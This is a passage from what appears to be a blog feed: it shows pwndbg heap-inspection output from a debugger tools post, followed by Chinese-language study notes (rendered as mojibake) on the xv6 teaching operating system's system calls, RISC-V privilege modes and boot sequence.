class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunkptr + chunkdata address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkptr 0x603010</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapinfo</span><br><span class="line">æŸ¥çœ‹å †çš„æƒ…å†µ</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x6032d0 (size : 0x20d30) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x6032c0</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwndbg + pwngdb + angelheap&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Xv6</title>
    <link href="https://humoooor.cn/2022/10/14/Xv6/"/>
    <id>https://humoooor.cn/2022/10/14/Xv6/</id>
    <published>2022-10-14T02:51:00.000Z</published>
    <updated>2023-05-23T03:22:08.733Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯ç¬”è€…åœ¨å­¦ä¹  MIT 6.1810 2022 Fall é˜…è¯» xv6 æ–‡æ¡£æ—¶æ‰€å†™ï¼Œå¤§éƒ¨åˆ†æ˜¯å°†åŸæ–‡ç¿»è¯‘ï¼Œç¬”è€…å°½å¯èƒ½åŠ å…¥è‡ªå·±çš„ç†è§£å¹¶æ’ç‰ˆï¼Œ<del>åº”è¯¥ä¼š</del>æŒç»­æ›´æ–°ç›´åˆ°æ–‡æ¡£è¯»å®Œ</p><span id="more"></span><h2 id="Chapter-1-Operating-system-interfaces"><a href="#Chapter-1-Operating-system-interfaces" class="headerlink" title="Chapter 1 Operating system interfaces"></a>Chapter 1 Operating system interfaces</h2><p>xv6 å®ç°çš„ Unix kernel çš„æœåŠ¡å’Œç³»ç»Ÿè°ƒç”¨çš„å­é›†</p><p>åœ¨ user ç›®å½•ä¸‹å¯æŸ¥çœ‹ç¨‹åºæºç </p><table><thead><tr><th align="center">System call</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">int fork()</td><td align="center">åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œè¿”å›å­è¿›ç¨‹çš„ PID</td></tr><tr><td align="center">int exit(int status)</td><td align="center">ç»“æŸå½“å‰è¿›ç¨‹ï¼Œstatus è¿”å›ç»™ wait()</td></tr><tr><td align="center">int wait(int *status)</td><td align="center">ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹ exitï¼Œexit çš„ status åœ¨ *statusä¸­ï¼Œè¿”å›å­è¿›ç¨‹ PIDï¼Œæ²¡æœ‰å­è¿›ç¨‹è¿”å› -1</td></tr><tr><td align="center">int kill(int pid)</td><td align="center">ç»“æŸ PID å¯¹åº”çš„è¿›ç¨‹ï¼Œè¿”å› 0 æˆ– -1</td></tr><tr><td align="center">int getpid()</td><td align="center">è¿”å›å½“å‰è¿›ç¨‹çš„ PID</td></tr><tr><td align="center">int sleep(int n)</td><td align="center">æš‚åœ n ä¸ªæ—¶é’Ÿ</td></tr><tr><td align="center">int exec(char *file, char *argv[])</td><td align="center">åŠ è½½æ–‡ä»¶å¹¶ä½¿ç”¨å‚æ•°æ‰§è¡Œï¼Œä»…åœ¨é”™è¯¯æ—¶è¿”å›</td></tr><tr><td align="center">char *sbrk(int n)</td><td align="center">å†…å­˜å¢åŠ  n å­—èŠ‚ï¼Œè¿”å›æ–°å†…å­˜çš„é¦–åœ°å€</td></tr><tr><td align="center">int open(char *file, int flags)</td><td align="center">æ‰“å¼€æ–‡ä»¶ï¼Œflags è¡¨ç¤ºè¯»å†™ï¼Œè¿”å›ä¸€ä¸ª fd</td></tr><tr><td align="center">int write(int fd, char *buf, int n)</td><td align="center">ä» buf å‘ fd å†™ n å­—èŠ‚ï¼Œè¿”å› n</td></tr><tr><td align="center">int read(int fd, char *buf, int n)</td><td align="center">ä» fd è¯» n å­—èŠ‚å‘ buf å†™å…¥ï¼Œè¿”å›è¯»çš„å­—èŠ‚æ•°</td></tr><tr><td align="center">int close(int fd)</td><td align="center">é‡Šæ”¾ fd</td></tr><tr><td align="center">int dup(int fd)</td><td align="center">è¿”å›ä¸ fd ç›¸åŒæ–‡ä»¶çš„ä¸€ä¸ªæ–°çš„ fd</td></tr><tr><td align="center">int pipe(int p[])</td><td align="center">åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå°†è¯»å†™ fd æ”¾å…¥ p[0] å’Œ p[1]</td></tr><tr><td align="center">int chdir(char *dir)</td><td align="center">æ”¹å˜å½“å‰ç›®å½•</td></tr><tr><td align="center">int mkdir(char *dir)</td><td align="center">åˆ›å»ºä¸€ä¸ªç›®å½•</td></tr><tr><td align="center">int mknod(char *file, int, int)</td><td align="center">åˆ›å»ºä¸€ä¸ªè®¾å¤‡æ–‡ä»¶</td></tr><tr><td align="center">int fstat(int fd, struct stat *st)</td><td align="center">è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st</td></tr><tr><td align="center">int stat(char *file, struct stat *st)</td><td align="center">è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st</td></tr><tr><td align="center">int link(char *file1, char *file2)</td><td align="center">ä¸º file1 åˆ›å»ºå¦ä¸€ä¸ªåå­— file2ï¼Œå³ç¡¬é“¾æ¥</td></tr><tr><td align="center">int unlink(char *file)</td><td align="center">åˆ é™¤ä¸€ä¸ªæ–‡ä»¶</td></tr></tbody></table><p>å¦‚æœæ²¡æœ‰å¦å¤–è¯´æ˜ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å› 0 ä¸ºæ­£å¸¸ï¼Œè¿”å› -1 ä¸ºé”™è¯¯</p><h3 id="è¿›ç¨‹å’Œå†…å­˜"><a href="#è¿›ç¨‹å’Œå†…å­˜" class="headerlink" title="è¿›ç¨‹å’Œå†…å­˜"></a>è¿›ç¨‹å’Œå†…å­˜</h3><p>çˆ¶å­è¿›ç¨‹çš„å†…å­˜å…³ç³»</p><h3 id="I-O-å’Œæ–‡ä»¶æè¿°ç¬¦"><a href="#I-O-å’Œæ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="I/O å’Œæ–‡ä»¶æè¿°ç¬¦"></a>I/O å’Œæ–‡ä»¶æè¿°ç¬¦</h3><h3 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h3><p>p[0] ä¸ºè¯»ç«¯ï¼Œp[1] ä¸ºå†™ç«¯</p><p>å¦‚æœè¯»ç«¯æ²¡æœ‰æ•°æ®ï¼Œread ä¼šç­‰å¾…æ•°æ®å†™å…¥æˆ–ç­‰å¾…æŒ‡å‘å†™ç«¯çš„æ‰€æœ‰ fd å…³é—­ï¼Œåè€…ç±»ä¼¼åˆ°æ–‡ä»¶ç»“å°¾ï¼Œ read ä¼šè¿”å› 0</p><p>å¦‚æœ read åˆ°è¯»ç«¯ï¼Œä¼šä¸€ç›´ç­‰å¾…</p><p>shell å¯ä»¥ç”¨ | ç¬¦å·å®ç°ç®¡é“</p><p><code>grep fork sh.c | wc -l</code> å°† | å·¦è¾¹çš„ç»“æœé€šè¿‡ç®¡é“æµå‘å³è¾¹</p><p>å¤š | å¯ä»¥åˆ›å»ºè¿›ç¨‹æ ‘</p><ol><li>ç®¡é“å¯ä»¥è‡ªå·±æ¸…ç†è‡ªå·±</li><li>å¯ä»¥é€šè¿‡ä»»æ„é•¿åº¦çš„æ•°æ®æµ</li><li>ç®¡é“å¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li></ol><h3 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h3><p>#todo</p><h3 id="çœŸå®ä¸–ç•Œ"><a href="#çœŸå®ä¸–ç•Œ" class="headerlink" title="çœŸå®ä¸–ç•Œ"></a>çœŸå®ä¸–ç•Œ</h3><p>Unix ç³»ç»Ÿè°ƒç”¨æ¥å£é€šè¿‡ POSIX æ ‡å‡†è¿›è¡Œæ ‡å‡†åŒ–</p><h2 id="Chapter-2-Operating-system-organization"><a href="#Chapter-2-Operating-system-organization" class="headerlink" title="Chapter 2 Operating system organization"></a>Chapter 2 Operating system organization</h2><p>ä¸‰ä¸ªè¦æ±‚</p><ul><li>å¤šè·¯å¤ç”¨</li><li>éš”ç¦»</li><li>äº¤äº’</li></ul><h3 id="æŠ½è±¡ç‰©ç†èµ„æº"><a href="#æŠ½è±¡ç‰©ç†èµ„æº" class="headerlink" title="æŠ½è±¡ç‰©ç†èµ„æº"></a>æŠ½è±¡ç‰©ç†èµ„æº</h3><p>æ¯ä¸ªåº”ç”¨ç¨‹åºç›´æ¥è®¿é—®ç‰©ç†èµ„æº</p><ul><li>æ•ˆç‡é«˜</li><li>éœ€è¦åº”ç”¨ç¨‹åºä¹‹é—´å¯ä¿¡ä¸”æ²¡æœ‰é”™è¯¯</li></ul><p>å› æ­¤éœ€è¦è¿›è¡Œ<strong>å¼ºéš”ç¦»</strong>ï¼ŒåŒæ—¶ä¹Ÿä¼šæä¾›ä¾¿åˆ©</p><p>ç¦æ­¢åº”ç”¨ç¨‹åºç›´æ¥è®¿é—®æ•æ„Ÿçš„ç¡¬ä»¶èµ„æºï¼Œå°†èµ„æºæŠ½è±¡ä¸ºæœåŠ¡</p><h3 id="ç”¨æˆ·-ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨"><a href="#ç”¨æˆ·-ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç”¨æˆ·/ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨"></a>ç”¨æˆ·/ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨</h3><p>å¼ºéš”ç¦»éœ€è¦åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿä¹‹é—´æœ‰ç¡¬è¾¹ç•Œ</p><p>CPU èƒ½æä¾›ç¡¬ä»¶æ”¯æŒ</p><p>RISC-V çš„ CPU æœ‰ä¸‰ç§æ¨¡å¼ï¼šæœºå™¨æ¨¡å¼ã€ç®¡ç†è€…ï¼ˆsupervisorï¼‰æ¨¡å¼ã€ç”¨æˆ·æ¨¡å¼</p><ul><li>æœºå™¨æ¨¡å¼<ul><li>æ‰§è¡Œçš„æŒ‡ä»¤å…·æœ‰å®Œå…¨ç‰¹æƒ</li><li>ä¸»è¦ç”¨å…·é…ç½®è®¡ç®—æœºï¼Œè¿è¡Œä¸€æ®µä»£ç åä¼šè¿›å…¥å†…æ ¸æ¨¡å¼</li></ul></li><li>ç®¡ç†è€…æ¨¡å¼<ul><li>CPU å¯æ‰§è¡Œç‰¹æƒæŒ‡ä»¤<ul><li>å¯ç”¨ã€ç¦ç”¨ç»ˆç«¯</li><li>è¯»å†™é¡µè¡¨å¯„å­˜å™¨</li></ul></li></ul></li><li>ç”¨æˆ·æ¨¡å¼<ul><li>CPU ä¸èƒ½æ‰§è¡Œç‰¹æƒæŒ‡ä»¤<ul><li>å¦‚æœå°è¯•æ‰§è¡Œï¼ŒCPU ä¼šåˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ï¼Œå¹¶ä¸”æ€æ­»åº”ç”¨ç¨‹åº</li></ul></li><li>é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è°ƒç”¨å†…æ ¸å‡½æ•°<ul><li>ç³»ç»Ÿè°ƒç”¨ä¼šè·³è½¬åˆ°å†…æ ¸æŒ‡å®šçš„å…¥å£ç‚¹</li><li>CPU ä»ç”¨æˆ·æ¨¡å¼åˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼</li><li>å†…æ ¸å¯ä»¥éªŒè¯ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ˜¯å¦åˆç†ï¼Œå†³å®šæ˜¯å¦è¿›è¡Œè¯·æ±‚çš„æ“ä½œ</li></ul></li></ul></li></ul><p>å†…æ ¸å’Œç®¡ç†è€…æ¨¡å¼ä¼¼ä¹æœ‰ç‚¹åˆ†ä¸æ¸…ï¼Ÿ</p><p>ç¬”è€…çš„ç†è§£ï¼šç®¡ç†è€…æ¨¡å¼æ˜¯ RISC-V çš„ CPU å®šä¹‰çš„ï¼Œç›¸å¯¹äºç”¨æˆ·æ¨¡å¼å¤šäº†ä¸€äº›ç‰¹æƒï¼›å†…æ ¸æ˜¯ç›¸å¯¹ç”¨æˆ·ä»£ç è€Œè¨€ï¼Œè¿è¡Œåœ¨ä¸åŒçš„æ¨¡å¼ä¸‹ã€‚æ¨¡å¼å¯¹åº”ç€èº«ä»½ï¼Œå†…æ ¸å’Œç”¨æˆ·ä»£ç å¯¹åº”ç€ä¸€ä¸ªå®ä½“</p><h3 id="å†…æ ¸æ¶æ„"><a href="#å†…æ ¸æ¶æ„" class="headerlink" title="å†…æ ¸æ¶æ„"></a>å†…æ ¸æ¶æ„</h3><h4 id="å®å†…æ ¸è®¾è®¡"><a href="#å®å†…æ ¸è®¾è®¡" class="headerlink" title="å®å†…æ ¸è®¾è®¡"></a>å®å†…æ ¸è®¾è®¡</h4><p>ç¼ºç‚¹ï¼šæ“ä½œç³»ç»Ÿä¸åŒéƒ¨åˆ†ä¹‹é—´çš„æ¥å£å¤æ‚ï¼Œç¼–å†™ä»£ç å®¹æ˜“å‡ºé”™</p><h4 id="å¾®å†…æ ¸è®¾è®¡"><a href="#å¾®å†…æ ¸è®¾è®¡" class="headerlink" title="å¾®å†…æ ¸è®¾è®¡"></a>å¾®å†…æ ¸è®¾è®¡</h4><p>æœ€å¤§é™åº¦åœ°å‡å°‘å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œçš„æ“ä½œç³»ç»Ÿä»£ç æ•°é‡ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å¤§éƒ¨åˆ†åŠŸèƒ½</p><h3 id="xv6-kernel-ä»£ç æ¶æ„"><a href="#xv6-kernel-ä»£ç æ¶æ„" class="headerlink" title="xv6 kernel ä»£ç æ¶æ„"></a>xv6 kernel ä»£ç æ¶æ„</h3><table><thead><tr><th>æ–‡ä»¶</th><th>æè¿°</th><th>æ–‡ä»¶</th><th>æè¿°</th></tr></thead><tbody><tr><td>bio.c</td><td>æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜å—ç¼“å†²</td><td>proc.c</td><td>è¿›ç¨‹å’Œè°ƒåº¦</td></tr><tr><td>console.c</td><td>è¿æ¥åˆ°ç”¨æˆ·é”®ç›˜å’Œå±å¹•</td><td>sleeplock.c</td><td>æ”¾å¼ƒ CPU çš„é”</td></tr><tr><td>entry.S</td><td>ç¬¬ä¸€æ¬¡å¯åŠ¨çš„æŒ‡ä»¤</td><td>spinlock.c</td><td>ä¸æ”¾å¼ƒ CPU çš„é”</td></tr><tr><td>exec.c</td><td><code>exec()</code> ç³»ç»Ÿè°ƒç”¨</td><td>start.c</td><td>æœºå™¨æ¨¡å¼æ—©æœŸå¯åŠ¨ä»£ç </td></tr><tr><td>file.c</td><td>æ–‡ä»¶æè¿°ç¬¦</td><td>string.c</td><td>C å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„ä»£ç åº“</td></tr><tr><td>fs.c</td><td>æ–‡ä»¶ç³»ç»Ÿ</td><td>swtch.S</td><td>çº¿ç¨‹åˆ‡æ¢</td></tr><tr><td>kalloc.c</td><td>ç‰©ç†é¡µåˆ†é…å™¨</td><td>syscall.c</td><td>ç³»ç»Ÿè°ƒç”¨çš„è°ƒåº¦</td></tr><tr><td>kernelvec.S</td><td>å¤„ç†æ¥è‡ªå†…æ ¸çš„é™·é˜±ï¼Œå®šæ—¶å™¨ä¸­æ–­</td><td>sysfile.c</td><td>æ–‡ä»¶ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨</td></tr><tr><td>log.c</td><td>æ–‡ä»¶ç³»ç»Ÿæ—¥å¿—è®°å½•å’Œå´©æºƒæ¢å¤</td><td>sysproc.c</td><td>è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨</td></tr><tr><td>main.c</td><td>å¯åŠ¨é˜¶æ®µæ§åˆ¶å…¶ä»–æ¨¡å—çš„åˆå§‹åŒ–</td><td>trampoline.S</td><td>åˆ‡æ¢ç”¨æˆ·/å†…æ ¸æ¨¡å¼çš„æ±‡ç¼–</td></tr><tr><td>pipe.c</td><td>ç®¡é“</td><td>trap.c</td><td>å¤„ç†é™·é˜±å’Œä¸­æ–­å¹¶ä»ä¸­è¿”å›</td></tr><tr><td>plic.c</td><td>RISC-V ä¸­æ–­æ§åˆ¶å™¨</td><td>uart.c</td><td>ä¸²å£æ§åˆ¶å°è®¾å¤‡é©±åŠ¨</td></tr><tr><td>printf.c</td><td>æ ¼å¼åŒ–è¾“å‡ºåˆ°æ§åˆ¶å°</td><td>virtio_disk.c</td><td>ç£ç›˜è®¾å¤‡é©±åŠ¨</td></tr><tr><td>vm.c</td><td>ç®¡ç†é¡µè¡¨å’Œåœ°å€ç©ºé—´</td><td>defs.h</td><td>æ¨¡å—é—´æ¥å£çš„å®šä¹‰</td></tr></tbody></table><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><h4 id="åœ°å€ç©ºé—´"><a href="#åœ°å€ç©ºé—´" class="headerlink" title="åœ°å€ç©ºé—´"></a>åœ°å€ç©ºé—´</h4><p>æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨ï¼Œå®šä¹‰äº†è¿›ç¨‹çš„åœ°å€ç©ºé—´</p><ul><li><p>æœ‰è®¸å¤šå› ç´ é™åˆ¶äº†è¿›ç¨‹åœ°å€ç©ºé—´çš„æœ€å¤§å€¼</p><ul><li>RISC-V çš„æŒ‡é’ˆä¸º 64 ä½</li><li>åœ¨é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€æ—¶ï¼Œç¡¬ä»¶ä»…ä½¿ç”¨ä½ 39 ä½</li><li>xv6 åªä½¿ç”¨ 38 ä½ #why</li><li>å› æ­¤æœ€å¤§åœ°å€ä½ 2^38^ - 1 = 0x3fffffffffï¼Œå³ MAXVAï¼ˆåœ¨ <code>kernel/risc.h</code> ä¸­å®šä¹‰ï¼‰ã€</li></ul></li><li><p>åœ¨åœ°å€ç©ºé—´çš„é¡¶éƒ¨ä¿ç•™äº†ä¸€é¡µç”¨ä½œ trampolineï¼ˆè·³æ¿ã€è¹¦åºŠï¼‰ï¼Œä¸€é¡µç”¨ä½œæ˜ å°„è¿›ç¨‹çš„ trapframeï¼ˆé™·é˜±å¸§ï¼‰ï¼Œxv6 ç”¨è¿™ä¸¤ä¸ªé¡µé¢è¿›å…¥å’Œé€€å‡ºå†…æ ¸</p><ul><li>trampoline åŒ…å«è¿›å…¥å’Œé€€å‡ºå†…æ ¸çš„ä»£ç </li><li>trapframe æ˜ å°„ç”¨äºä¿å­˜å’Œæ¢å¤ç”¨æˆ·è¿›ç¨‹çš„çŠ¶æ€</li></ul></li></ul><h4 id="è¿›ç¨‹çŠ¶æ€"><a href="#è¿›ç¨‹çŠ¶æ€" class="headerlink" title="è¿›ç¨‹çŠ¶æ€"></a>è¿›ç¨‹çŠ¶æ€</h4><p>xv6 å†…æ ¸ç»´æŠ¤æ¯ä¸ªè¿›ç¨‹çš„çŠ¶æ€ï¼Œå­˜æ”¾åˆ° proc ç»“æ„ä½“ä¸­ï¼ˆ<code>kernel/proc.h</code>ï¼‰</p><p>æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯é¡µè¡¨ã€å†…æ ¸æ ˆã€è¿è¡ŒçŠ¶æ€</p><p><code>p-&gt;state</code> è¡¨ç¤ºè¿›ç¨‹çŠ¶æ€ï¼ˆåˆ†é…ã€å‡†å¤‡è¿è¡Œã€ç­‰å¾…IOã€æ­£åœ¨é€€å‡ºï¼‰</p><p><code>p-&gt;pagetable</code> ä¿å­˜é¡µè¡¨ï¼Œè¿˜ç”¨ä½œå­˜å‚¨è¿›ç¨‹å†…å­˜çš„ç‰©ç†é¡µåœ°å€çš„è®°å½•</p><h4 id="æ ˆç©ºé—´"><a href="#æ ˆç©ºé—´" class="headerlink" title="æ ˆç©ºé—´"></a>æ ˆç©ºé—´</h4><ul><li>æ¯ä¸ªè¿›ç¨‹æœ‰ä¸¤ä¸ªæ ˆï¼šç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆï¼ˆp-&gt;kstackï¼‰</li><li>åœ¨æ‰§è¡Œç”¨æˆ·æŒ‡ä»¤æ—¶ï¼Œåªæœ‰ç”¨æˆ·æ ˆåœ¨ä½¿ç”¨ï¼Œå†…æ ¸æ ˆä¸ºç©º</li><li>å½“è¿›å…¥å†…æ ¸æ¨¡å¼ï¼ˆç³»ç»Ÿè°ƒç”¨æˆ–ä¸­æ–­ï¼‰ï¼Œå†…æ ¸ä»£ç ä¼šåœ¨å†…æ ¸æ ˆä¸Šæ‰§è¡Œï¼Œç”¨æˆ·æ ˆä¸å˜</li><li>å†…æ ¸æ ˆæ˜¯ç‹¬ç«‹çš„ï¼Œå³ä½¿è¿›ç¨‹ç ´åäº†ç”¨æˆ·æ ˆï¼Œå†…æ ¸ä¹Ÿå¯ä»¥æ‰§è¡Œ</li></ul><h3 id="å¯åŠ¨-xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç "><a href="#å¯åŠ¨-xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç " class="headerlink" title="å¯åŠ¨ xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç "></a>å¯åŠ¨ xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç </h3><ol><li>RISC-V å¼€æœºæ—¶ï¼Œä¼šè‡ªè¡Œåˆå§‹åŒ–ï¼Œè¿è¡Œå­˜å‚¨åœ¨ ROM ä¸­çš„å¼•å¯¼åŠ è½½ç¨‹åº</li><li>å¼•å¯¼åŠ è½½ç¨‹åºå°† xv6 å†…æ ¸åŠ è½½åˆ°å†…å­˜ 0x80000000 ä¸­ï¼Œå› ä¸º 0 ~ 0x80000000 ä¹‹é—´åŒ…å« IO è®¾å¤‡ï¼ˆRISC-V åœ¨åˆ†é¡µç¡¬ä»¶ç¦ç”¨å’Œè™šæ‹Ÿåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†åœ°å€æ¡ä»¶ä¸‹å¼€å§‹ï¼‰</li><li>åœ¨æœºå™¨æ¨¡å¼ä¸‹ï¼Œä» _entry å¼€å§‹æ‰§è¡Œ xv6<ul><li>_entry çš„æŒ‡ä»¤è®¾ç½®ä¸€ä¸ªæ ˆï¼Œä»¥ä¾¿ xv6 è¿è¡Œ C ä»£ç </li><li>xv6 åœ¨ <code>kernel/start.c</code> ä¸­å£°æ˜ä¸€ä¸ªåˆå§‹æ ˆ stack0 çš„ç©ºé—´</li><li>_entry çš„ä»£ç å°†æ ˆé¡¶å¯„å­˜å™¨ sp åŠ è½½åˆ° stack0 çš„é¡¶éƒ¨ stack0+0x1000</li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>kernel/start.c</code> ä¸­çš„ä»£ç </li></ul></li><li>start å‡½æ•°<ul><li>å…ˆåœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œé…ç½®ä»£ç <ul><li>ä¿®æ”¹ mstatus å¯„å­˜å™¨ä¸­ MPPï¼ˆMachine Previous Privilege modeï¼‰çš„å€¼ä¸º Supervisorï¼Œåœ¨ mret æ—¶è¿”å›åˆ°ç®¡ç†è€…æ¨¡å¼</li><li>å°† main çš„åœ°å€å†™å…¥ mepc å¯„å­˜å™¨ä½œä¸º mret è¿”å›åœ°å€</li><li>å°†æ‰€æœ‰ä¸­æ–­å’Œå¼‚å¸¸å§”æ‰˜ç»™å†…æ ¸</li><li>å°† 0 å†™å…¥ satp é¡µè¡¨å¯„å­˜å™¨ï¼Œç¦ç”¨å†…æ ¸æ¨¡å¼ä¸‹çš„è™šæ‹Ÿå†…å­˜è½¬æ¢</li><li>å¯¹æ—¶é’ŸèŠ¯ç‰‡ç¼–ç¨‹æ¥ç”Ÿæˆè®¡æ—¶å™¨ä¸­æ–­</li></ul></li><li>ç„¶åé€šè¿‡ mret æŒ‡ä»¤åˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ï¼Œè¿›å…¥å†…æ ¸ï¼Œæ‰§è¡Œ main å‡½æ•°<ul><li>mret å¸¸ç”¨äºåœ¨è¿›å…¥æœºå™¨æ¨¡å¼åè¿”å›åˆ°ç®¡ç†è€…æ¨¡å¼</li><li>start ä¼šå°†å‰ä¸€ä¸ªæ¨¡å¼è®¾ç½®ä¸ºç®¡ç†è€…æ¨¡å¼ï¼Œä»¥ä¾¿ç¬¦åˆ mret çš„æ¡ä»¶</li></ul></li></ul></li><li>main å‡½æ•°<ul><li>åˆå§‹åŒ–æ§åˆ¶å°</li><li>åˆå§‹åŒ–ç‰©ç†é¡µåˆ†é…å™¨</li><li>åˆ›å»ºå†…æ ¸é¡µè¡¨</li><li>åŠ è½½å¯åŠ¨é¡µé¢</li><li>åˆå§‹åŒ–è¿›ç¨‹è¡¨</li><li>è®¾ç½®å†…æ ¸çš„ trap å¤„ç†ä½ç½®</li><li>åˆå§‹åŒ–ä¸­æ–­æ§åˆ¶ PLIC</li><li>é€šè¿‡ä¸­æ–­è¯·æ±‚ PLIC è®¿é—®è®¾å¤‡</li><li>åˆå§‹åŒ– buffer ç¼“å­˜</li><li>åˆå§‹åŒ– inode ç¼“å­˜</li><li>åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿ</li><li>åˆå§‹åŒ–ç£ç›˜</li><li>è¿›å…¥ userinit å‡½æ•°</li></ul></li><li>userinit å‡½æ•°<ul><li>åˆ›å»ºç¬¬ä¸€ä¸ªè¿›ç¨‹</li><li>æ‰§è¡Œç”¨ RISC-V ç¼–å†™çš„å°ç¨‹åºï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨</li><li>åœ¨ <code>user/initcode.S</code> ä¸­æŠŠ SYS_exec ç³»ç»Ÿè°ƒç”¨å·ä¼ ç»™ a7 å¯„å­˜å™¨ï¼Œç„¶åè°ƒç”¨ ecall è¿›å…¥å†…æ ¸</li></ul></li></ol><h3 id="å®‰å…¨æ¨¡å‹"><a href="#å®‰å…¨æ¨¡å‹" class="headerlink" title="å®‰å…¨æ¨¡å‹"></a>å®‰å…¨æ¨¡å‹</h3><p>#todo</p><h3 id="çœŸå®ä¸–ç•Œ-1"><a href="#çœŸå®ä¸–ç•Œ-1" class="headerlink" title="çœŸå®ä¸–ç•Œ"></a>çœŸå®ä¸–ç•Œ</h3><p>å¤§å¤šæ•°æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†è¿›ç¨‹çš„æ¦‚å¿µï¼Œä½†æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹æ”¯æŒå¤šä¸ªçº¿ç¨‹ï¼Œä»¥å…è®¸å•ä¸ªè¿›ç¨‹åˆ©ç”¨å¤šä¸ª CPUï¼Œæ½œåœ¨åœ°æ›´æ”¹äº†æ¥å£ï¼ˆå¦‚ Linux çš„ cloneï¼Œfork çš„ä¸€ç§å˜ä½“ï¼‰ï¼Œæ¥æ§åˆ¶çº¿ç¨‹å…±äº«çš„å„ä¸ªæ–¹é¢</p><h2 id="Chapter-3-Page-tables"><a href="#Chapter-3-Page-tables" class="headerlink" title="Chapter 3 Page tables"></a>Chapter 3 Page tables</h2><p>#todo </p><h3 id="åˆ†é¡µç¡¬ä»¶"><a href="#åˆ†é¡µç¡¬ä»¶" class="headerlink" title="åˆ†é¡µç¡¬ä»¶"></a>åˆ†é¡µç¡¬ä»¶</h3><p>#todo</p><h3 id="å†…æ ¸åœ°å€ç©ºé—´"><a href="#å†…æ ¸åœ°å€ç©ºé—´" class="headerlink" title="å†…æ ¸åœ°å€ç©ºé—´"></a>å†…æ 